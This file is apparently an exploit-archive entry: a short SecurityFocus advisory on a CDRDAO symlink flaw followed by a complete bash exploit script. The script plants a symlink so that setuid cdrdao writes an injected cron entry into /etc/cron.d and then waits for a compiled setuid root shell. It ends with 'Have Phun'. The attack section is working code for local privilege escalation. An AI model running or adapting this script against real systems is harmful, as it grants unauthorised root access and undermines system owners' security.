@@ -1,0 +1,66 @@
+source: http://www.securityfocus.com/bid/3865/info
+ 
+CDRDAO is a freely available, open source CD recording software package available for the Unix and Linux Operating Systems. It is maintained by Andreas Mueller.
+ 
+When CDRDAO saves it's configuration to the .cdrdao file in a user's home directory, the file is saved with root ownership. Additionally, CDRDAO does not check for the previous existence of this file. Since the cdrdao executable is typically installed setuid root, it is possible for a user to create this file as a symbolic link, which could result in the overwriting of root-owned files, or potentially allow the user execute commands as root.
+
+#!/bin/bash
+
+## cdrdaohack.sh by Jens "atomi" Steube
+
+ROOTEXECDIR="/etc/cron.d/cdr"
+CDRDAO="/usr/bin/cdrdao"
+USERCONF="$HOME/.cdrdao"
+
+echo "Testing $CDRDAO"
+if [ ! -u $CDRDAO ]; then
+  echo "ERROR: $CDRDAO is not setuid or does not exist"
+  exit 1
+fi
+
+echo "Generating Helper Files"
+
+cat > /tmp/daosh.c << EOF
+int main () { 
+setuid(0); setgid(0);
+unlink("/tmp/dao.sh");
+unlink("/tmp/daosh.c");
+unlink("/etc/cron.d/cdr");
+unlink("$HOME/.cdrdao");
+execl("/bin/bash","bash","-i",0);
+}
+EOF
+
+cat > /tmp/dao.sh << EOF
+cc -o /tmp/daosh /tmp/daosh.c >/dev/null 2>&1
+chown root /tmp/daosh >/dev/null 2>&1
+chgrp root /tmp/daosh >/dev/null 2>&1
+chmod 6755 /tmp/daosh >/dev/null 2>&1
+exit 0
+EOF
+
+chmod 700 /tmp/dao.sh
+
+echo "Backing up original $USERCONF file to $USERCONF.orig"
+mv $USERCONF $USERCONF.orig >/dev/null 2>&1
+
+echo "Creating Symlink on $USERCONF to $ROOTEXECDIR"
+ln -s $ROOTEXECDIR $USERCONF
+
+echo "Executing $CDRDAO"
+
+$CDRDAO write --save --device '
+* * * * * root /tmp/dao.sh >/dev/null 2>&1
+#' --buffers '
+' . >/dev/null 2>&1
+
+echo "Waiting for Rootshell, wait at least 3 minutes"
+while [ ! -u /tmp/daosh ]; do
+  echo -n "."
+  sleep 1
+done
+
+echo
+echo "Entering Rootshell and removing Helper Files"
+echo "Have Phun :-)"
+/tmp/daosh
